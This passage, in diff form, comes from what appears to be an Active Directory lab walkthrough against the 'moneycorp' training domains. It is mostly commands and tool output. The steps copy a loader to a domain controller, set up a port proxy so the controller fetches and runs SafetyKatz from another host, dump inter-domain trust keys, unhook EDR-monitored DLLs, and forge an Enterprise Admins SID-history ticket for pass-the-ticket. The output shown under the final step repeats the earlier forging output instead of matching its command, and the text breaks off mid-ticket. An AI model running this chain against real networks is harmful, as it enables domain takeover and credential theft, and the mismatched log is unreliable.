+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      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
+[*] Target LUID: 0x2597b9
+[+] Ticket successfully imported!
+
+  ServiceName              :  krbtgt/DOLLARCORP.MONEYCORP.LOCAL
+  ServiceRealm             :  DOLLARCORP.MONEYCORP.LOCAL
+  UserName                 :  svcadmin (NT_PRINCIPAL)
+  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
+  StartTime                :  9/29/2025 11:50:14 AM
+  EndTime                  :  9/29/2025 9:50:14 PM
+  RenewTill                :  10/6/2025 11:50:14 AM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  1qs/BIrH08Ph94d1gbvJw2AbKQfx3Swtt4P2lWjW5aU=
+  ASREP (key)              :  6366243A657A4EA04E406F1ABC27F1ADA358CCD0138EC5CA2835067719DC7011
+```
+
+### Run the below commands from the process running as DA to copy Loader.exe on dcorp-dc and use it to extract credentials
+
+* C:\Windows\system32> echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
+```
+Does \\dcorp-dc\C$\Users\Public\Loader.exe specify a file name
+or directory name on the target
+(F = file, D = directory)? F
+C:\AD\Tools\Loader.exe
+1 File(s) copied
+```
+
+* C:\Windows\system32> winrs -r:dcorp-dc cmd
+
+* C:\Users\svcadmin> netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.31
+
+* C:\Users\svcadmin> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
+```
+mimikatz(commandline) # lsadump::evasive-trust /patch
+
+Current domain: DOLLARCORP.MONEYCORP.LOCAL (dcorp / S-1-5-21-719815819-3726368948-3917688648)
+
+Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-335606122-960912869-3279953914)
+ [  In ] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
+    * 9/29/2025 6:16:22 AM - CLEAR   - 3d 7b 6d 8e c0 ac dd 93 41 d7 b7 08 52 9b b5 9e fe 9d eb 22 c0 dc 1c 00 a4 29 cf a0
+        * aes256_hmac       f5df9e0114b22c7d407390ded7518f099df459b0f5cfa6442a002ff6ada20b08
+        * aes128_hmac       5ae1bd2a9ff73bc182f346c29f510cb0
+        * rc4_hmac_nt       71aec776d7fcdf15e2c88ad385d3ae56
+
+ [ Out ] MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
+    * 9/29/2025 6:16:22 AM - CLEAR   - 3d 7b 6d 8e c0 ac dd 93 41 d7 b7 08 52 9b b5 9e fe 9d eb 22 c0 dc 1c 00 a4 29 cf a0
+        * aes256_hmac       971bea1bd496d8a861e5e8eb9c01ad02f86f07c8b1dce9a33bce97d5304121fc
+        * aes128_hmac       4b1134b67f242aa25b232be34c477156
+        * rc4_hmac_nt       71aec776d7fcdf15e2c88ad385d3ae56
+
+ [ In-1] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
+    * 9/29/2025 6:01:42 AM - CLEAR   - b4 7c 78 65 11 dd 1a 2c 73 37 09 e7 99 74 df 0c 5f 36 51 ae da cc 31 d6 26 f2 eb cb
+        * aes256_hmac       a1c88f2007e13ffd0738c872a8da2cf1a2f5c646ecf7250cf411efa2f4c8089c
+        * aes128_hmac       77435bfd4e0f70dbf8b413d997e82831
+        * rc4_hmac_nt       0de9fd50b5efab081a6dffdbdad81365
+
+ [Out-1] MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
+    * 9/29/2025 6:01:42 AM - CLEAR   - b4 7c 78 65 11 dd 1a 2c 73 37 09 e7 99 74 df 0c 5f 36 51 ae da cc 31 d6 26 f2 eb cb
+        * aes256_hmac       ffd707848548078e1bbfa9499482b1c52cbf1addd67e80c3ddd3bed09d86af49
+        * aes128_hmac       1f54cd8cef36b8ab6b0f651e69640c4b
+        * rc4_hmac_nt       0de9fd50b5efab081a6dffdbdad81365
+
+
+Domain: US.DOLLARCORP.MONEYCORP.LOCAL (US / S-1-5-21-1028785420-4100948154-1806204659)
+ [  In ] DOLLARCORP.MONEYCORP.LOCAL -> US.DOLLARCORP.MONEYCORP.LOCAL
+    * 9/29/2025 6:16:28 AM - CLEAR   - 1c b8 bb 7c 3b 60 61 c0 18 ed 98 4e dc 5b 1d 95 d7 1a 70 bd 89 e0 6b 1f fd e5 46 aa
+        * aes256_hmac       756e2b78302cfcb400ab4828451fd6c5034641dd5624879a4b79af2e75053bd6
+        * aes128_hmac       fd860fd4fb33a628edb3f1abbf8641cc
+        * rc4_hmac_nt       756d91067ba3e63145b0a23cb8af1b2b
+
+ [ Out ] US.DOLLARCORP.MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
+    * 9/29/2025 6:16:28 AM - CLEAR   - 1c b8 bb 7c 3b 60 61 c0 18 ed 98 4e dc 5b 1d 95 d7 1a 70 bd 89 e0 6b 1f fd e5 46 aa
+        * aes256_hmac       18b32ba1c1d4b5ed7d2f32bb6a82483032611c5c5d2635b4c6e3fa803f5f9480
+        * aes128_hmac       84c8618a04082c830b4ba775f75ad66a
+        * rc4_hmac_nt       756d91067ba3e63145b0a23cb8af1b2b
+
+ [ In-1] DOLLARCORP.MONEYCORP.LOCAL -> US.DOLLARCORP.MONEYCORP.LOCAL
+    * 9/29/2025 6:01:56 AM - CLEAR   - 2f fa 6d dc e0 04 e4 b9 eb 0c 5a 66 7b db 0a 4a fb 76 31 61 d8 8d b2 2d 7a 45 06 1b
+        * aes256_hmac       c92c7306d29c455980c40ef2166f81e428c1ba5399f56faa86d1e3a6c916b80f
+        * aes128_hmac       7a2ff334f3e3347b4d41e84acbdf7855
+        * rc4_hmac_nt       44bbb47568e83b4fd4e8dbd3d547c427
+
+ [Out-1] US.DOLLARCORP.MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
+    * 9/29/2025 6:01:56 AM - CLEAR   - 2f fa 6d dc e0 04 e4 b9 eb 0c 5a 66 7b db 0a 4a fb 76 31 61 d8 8d b2 2d 7a 45 06 1b
+        * aes256_hmac       918d8d3ba3c5f32137108b68701476236d55826a06c2fa957b8fe25d118279ec
+        * aes128_hmac       d20b6dbe66437dc4b7d9d1adfd6958f5
+        * rc4_hmac_nt       44bbb47568e83b4fd4e8dbd3d547c427
+
+
+Domain: EUROCORP.LOCAL (ecorp / S-1-5-21-3333069040-3914854601-3606488808)
+ [  In ] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL
+    * 9/29/2025 6:16:26 AM - CLEAR   - 53 8d 46 98 c8 18 29 2a 3e 8e 98 a9 ae 58 6f 48 ae 3e 69 1b 71 45 75 33 ee fe a9 a1
+        * aes256_hmac       7ca2124ec30f6e3428d216b010b1000565c7da3394514e45e4cf07db2a03282b
+        * aes128_hmac       021aa8b46cd27277f611face6f4faef8
+        * rc4_hmac_nt       d390a1c5ea42d2cfce4058c1a128fbba
+
+ [ Out ] EUROCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
+    * 9/29/2025 6:16:26 AM - CLEAR   - 53 8d 46 98 c8 18 29 2a 3e 8e 98 a9 ae 58 6f 48 ae 3e 69 1b 71 45 75 33 ee fe a9 a1
+        * aes256_hmac       ba7cc062e3388afc9b39c56a9e35fb77b899abb7dd7ceb9aed9d758f3f7c490f
+        * aes128_hmac       39d348732d144bec494bdec80b792db7
+        * rc4_hmac_nt       d390a1c5ea42d2cfce4058c1a128fbba
+
+ [ In-1] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL
+    * 9/29/2025 6:01:52 AM - CLEAR   - 1e bb db 29 af 1d 95 9c 78 4c dc 2c 5b 24 e9 56 e4 ae 04 dc 5a 99 cb 45 77 aa 34 c5
+        * aes256_hmac       10a0b7415471a1a1eb373a6076d0d916c155afee964d30e218871186c57b2c6c
+        * aes128_hmac       786bd9d0c950fb1c3c56626ab7b2ffb4
+        * rc4_hmac_nt       603518e54242753e9b77f4e7d702ff6c
+
+ [Out-1] EUROCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
+    * 9/29/2025 6:01:52 AM - CLEAR   - 1e bb db 29 af 1d 95 9c 78 4c dc 2c 5b 24 e9 56 e4 ae 04 dc 5a 99 cb 45 77 aa 34 c5
+        * aes256_hmac       f56429861d982209946d43adfa40405310c456010f64cccccb02b9e636245f51
+        * aes128_hmac       5004628e8ae8d7e6e1503e6017f70bf8
+        * rc4_hmac_nt       603518e54242753e9b77f4e7d702ff6c
+
+mimikatz(commandline) # exit
+Bye!
+```
+
+### Forge ticket - Let’s Forge a ticket with SID History of Enterprise Admins. 
+
+* C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:71aec776d7fcdf15e2c88ad385d3ae56 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
+
+```
+[+] Successfully unhooked ETW!
+[+++] NTDLL.DLL IS UNHOOKED!
+[+++] KERNEL32.DLL IS UNHOOKED!
+[+++] KERNELBASE.DLL IS UNHOOKED!
+[+++] ADVAPI32.DLL IS UNHOOKED!
+[+] URL/PATH : C:\AD\Tools\Rubeus.exe Arguments : evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:71aec776d7fcdf15e2c88ad385d3ae56 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
+[*] Action: Build TGS
+
+[*] Trying to query LDAP using LDAPS for user information on domain controller dcorp-dc.dollarcorp.moneycorp.local
+[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(samaccountname=Administrator)'
+[*] Retrieving group and domain policy information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
+[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-719815819-3726368948-3917688648-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
+[*] Attempting to mount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL
+[X] Error mounting \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL error code ERROR_ACCESS_DENIED (5)
+[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
+[*] Attempting to mount: \\us.dollarcorp.moneycorp.local\SYSVOL
+[X] Error mounting \\us.dollarcorp.moneycorp.local\SYSVOL error code ERROR_BAD_NET_NAME (67)
+[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
+[*] Retrieving netbios name information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
+[*] Searching path 'CN=Configuration,DC=moneycorp,DC=local' for '(&(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))'
+[*] Retrieving group and domain policy information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
+[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-1028785420-4100948154-1806204659-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
+[*] Attempting to mount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL
+[X] Error mounting \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL error code ERROR_ACCESS_DENIED (5)
+[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
+[*] Attempting to mount: \\us.dollarcorp.moneycorp.local\SYSVOL
+[X] Error mounting \\us.dollarcorp.moneycorp.local\SYSVOL error code ERROR_BAD_NET_NAME (67)
+[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
+[*] Retrieving netbios name information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
+[*] Searching path 'CN=Configuration,DC=moneycorp,DC=local' for '(&(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))'
+[*] Building PAC
+
+[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
+[*] SID            : S-1-5-21-719815819-3726368948-3917688648
+[*] UserId         : 500
+[*] Groups         : 544,512,520,513
+[*] ExtraSIDs      : S-1-5-21-335606122-960912869-3279953914-519
+[*] ServiceKey     : 71AEC776D7FCDF15E2C88AD385D3AE56
+[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
+[*] KDCKey         : 71AEC776D7FCDF15E2C88AD385D3AE56
+[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
+[*] Service        : krbtgt
+[*] Target         : DOLLARCORP.MONEYCORP.LOCAL
+
+[*] Generating EncTicketPart
+[*] Signing PAC
+[*] Encrypting EncTicketPart
+[*] Generating Ticket
+[*] Generated KERB-CRED
+[*] Forged a TGT for 'Administrator@dollarcorp.moneycorp.local'
+
+[*] AuthTime       : 9/29/2025 2:02:36 PM
+[*] StartTime      : 9/29/2025 2:02:36 PM
+[*] EndTime        : 9/30/2025 12:02:36 AM
+[*] RenewTill      : 10/6/2025 2:02:36 PM
+
+[*] base64(ticket.kirbi):
+
+      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
+```
+
+### Copy the base64 encoded ticket from above and use it in the following command
+
+* C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:doIGPjCCBjqgAwIBBaEDAgEWooIFCjCCBQZhggUCMIIE...
+
+```
+[+] Successfully unhooked ETW!
+[+++] NTDLL.DLL IS UNHOOKED!
+[+++] KERNEL32.DLL IS UNHOOKED!
+[+++] KERNELBASE.DLL IS UNHOOKED!
+[+++] ADVAPI32.DLL IS UNHOOKED!
+[+] URL/PATH : C:\AD\Tools\Rubeus.exe Arguments : evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:71aec776d7fcdf15e2c88ad385d3ae56 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
+[*] Action: Build TGS
+
+[*] Trying to query LDAP using LDAPS for user information on domain controller dcorp-dc.dollarcorp.moneycorp.local
+[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(samaccountname=Administrator)'
+[*] Retrieving group and domain policy information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
+[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-719815819-3726368948-3917688648-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
+[*] Attempting to mount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL
+[X] Error mounting \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL error code ERROR_ACCESS_DENIED (5)
+[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
+[*] Attempting to mount: \\us.dollarcorp.moneycorp.local\SYSVOL
+[X] Error mounting \\us.dollarcorp.moneycorp.local\SYSVOL error code ERROR_BAD_NET_NAME (67)
+[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
+[*] Retrieving netbios name information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
+[*] Searching path 'CN=Configuration,DC=moneycorp,DC=local' for '(&(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))'
+[*] Retrieving group and domain policy information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
+[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-1028785420-4100948154-1806204659-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
+[*] Attempting to mount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL
+[X] Error mounting \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL error code ERROR_ACCESS_DENIED (5)
+[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
+[*] Attempting to mount: \\us.dollarcorp.moneycorp.local\SYSVOL
+[X] Error mounting \\us.dollarcorp.moneycorp.local\SYSVOL error code ERROR_BAD_NET_NAME (67)
+[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
+[*] Retrieving netbios name information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
+[*] Searching path 'CN=Configuration,DC=moneycorp,DC=local' for '(&(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))'
+[*] Building PAC
+
+[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
+[*] SID            : S-1-5-21-719815819-3726368948-3917688648
+[*] UserId         : 500
+[*] Groups         : 544,512,520,513
+[*] ExtraSIDs      : S-1-5-21-335606122-960912869-3279953914-519
+[*] ServiceKey     : 71AEC776D7FCDF15E2C88AD385D3AE56
+[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
+[*] KDCKey         : 71AEC776D7FCDF15E2C88AD385D3AE56
+[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
+[*] Service        : krbtgt
+[*] Target         : DOLLARCORP.MONEYCORP.LOCAL
+
+[*] Generating EncTicketPart
+[*] Signing PAC
+[*] Encrypting EncTicketPart
+[*] Generating Ticket
+[*] Generated KERB-CRED
+[*] Forged a TGT for 'Administrator@dollarcorp.moneycorp.local'
+
+[*] AuthTime       : 9/29/2025 2:02:36 PM
+[*] StartTime      : 9/29/2025 2:02:36 PM
+[*] EndTime        : 9/30/2025 12:02:36 AM
+[*] RenewTill      : 10/6/2025 2:02:36 PM
+
+[*] base64(ticket.kirbi):
+
+      doIGPjCCBjqgAwIBBaEDAgEWooIFCjCCBQZhggUCMIIE/qADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKOCBKYwggSioAMCARehAwIBA6KCBJQEggSQzqGgrDiTC8OwtURS1rtlbgzOVqZbkdnzX/r5kbb2YePUbu57h8wFblirI1LqxlWeDl0ZOdb4ERVHHl6hBX6QtcRsBZNIVQjc+LYUMw/eI819bUCKbk1AGAq8YwkNEv/oHdAqgeHnLwDbQHj4Cbk1J1b+i9DN4WvEbTLydZpf7jBCtgROm8nhu8CyMiwvWHh4VZpinwQs9A9AXAxI1SISBQVe86AhGD6GPCYbK6w89Up9XSe/nsVE6W/9gC2+682lBjOOF5AYFKZCqf8TNzjH9TqIq7D08aWmXb1GWVhdngw70NFvBj1M+eW/37Fm0xs2XgPxWfGMm5JC6afXUH0UyLUMYoCUFpMOL4xvDLN7hjzFCHM4CL0fX92ukWzQg6TwbOFa4afMFKodyxs0YlFO46/1h11uwT0P4z8IfQN2vx661gc5txOx8wRZGvCjxhsXT+TwOL8ry2Nz0qxY0x7jNdM/EArdYPWv5hCayf1DX+TAgGVA/UQS7d59Q7X1woTvnXgyRRCKoihoKG3vFRCO7IwW2fwJeDHTuIqzbtTBpnTz3PbnyJu3SDTNdYlpkLLxCNn1WnJj6U3aMTLn0pBtVVD0GOo5thc+nEsd8a5FW+Ya/MD5SLMnEsa9disCK9Mx50HYG6i/JVu+asxd1r7zsyy2fqXckbHs2QSa6Hi+3vxn3a5kp/8mrS9G3WLJc0OJ+dxTJTi8Vdcjc35mbfoIWTlpa1OQKEvIFxTyH5REbtccV0hFg3ifa22KNZpW5nbGA7hEQcfbTmTAr0ZN4D3Nj/YMco7JNdfto0lIpTOrwLzfyEbRdJUZiqKxhQj6plngSbF3+jPqi5tULC1bmQJW9QO0UnXxHrmHlGs+uDUqxhu9H+3jfu20HVr6jWKsKgTuNSqF2t2ZJiyXBDAFYsI6egJPdOFuvrVpIiiIr1778QS1xo9wYrJuQxkUP4oekXf7iUnvnyLIixAJlHqrFP0aW4khaPgXSDBcwo4A8df2CC6Ja6FWRgc4TfelPW96IpYENwWhDFNyn0dZ3ItzIiTNkcwemsbMzHvBpw1zDDNZ3btIUTsx5QJmZJGuStpKJV4dP1Mmsu3v3ZeRHMtuMELxJeHyfut6ZV7UqUKJib/5Bgtw3Pf5OSLFdcw/t/oMoo